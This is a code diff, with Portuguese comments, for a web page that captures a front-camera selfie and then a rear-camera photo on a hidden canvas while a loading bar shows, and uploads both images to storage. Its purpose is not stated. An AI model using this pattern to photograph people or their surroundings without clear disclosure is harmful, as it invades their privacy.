@@ -84,7 +84,7 @@
 
       showLoader(); // Exibe a barra de carregamento
 
-      // Primeiro captura a selfie com a câmera frontal
+      // Captura a selfie com a câmera frontal
       navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
         .then(stream => {
           video.srcObject = stream;
@@ -118,43 +118,28 @@
       const canvas = document.createElement('canvas'); // Cria o canvas oculto
 
       // Solicitar permissão para a câmera traseira (facingMode: 'environment')
-      navigator.mediaDevices.enumerateDevices()
-        .then(devices => {
-          const backCamera = devices.find(device => device.kind === 'videoinput' && device.facing === 'environment');
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+        .then(stream => {
+          video.srcObject = stream;
+          video.play();
 
-          if (backCamera) {
-            // Inicia a captura da câmera traseira
-            navigator.mediaDevices.getUserMedia({ video: { deviceId: backCamera.deviceId } })
-              .then(stream => {
-                video.srcObject = stream;
-                video.play();
+          video.onloadedmetadata = () => {
+            // Captura a foto com a câmera traseira
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                video.onloadedmetadata = () => {
-                  // Captura a foto com a câmera traseira
-                  canvas.width = video.videoWidth;
-                  canvas.height = video.videoHeight;
-                  const context = canvas.getContext('2d');
-                  context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            // Para a câmera e captura a imagem
+            stream.getTracks().forEach(track => track.stop());
 
-                  // Para a câmera e captura a imagem
-                  stream.getTracks().forEach(track => track.stop());
-
-                  const backCameraData = canvas.toDataURL('image/png', 1.0); // Gera a imagem em alta qualidade
-                  uploadPhotosToStorage(frontSelfieData, backCameraData);
-                };
-              })
-              .catch(error => {
-                hideLoader();
-                alert('Erro ao acessar a câmera traseira. Verifique as permissões e tente novamente. Detalhes do erro: ' + error.message);
-              });
-          } else {
-            hideLoader();
-            alert('Câmera traseira não detectada.');
-          }
+            const backCameraData = canvas.toDataURL('image/png', 1.0); // Gera a imagem em alta qualidade
+            uploadPhotosToStorage(frontSelfieData, backCameraData);
+          };
         })
         .catch(error => {
           hideLoader();
-          alert('Erro ao acessar dispositivos de vídeo. Detalhes do erro: ' + error.message);
+          alert('Erro ao acessar a câmera traseira. Verifique as permissões e tente novamente. Detalhes do erro: ' + error.message);
         });
     }
 
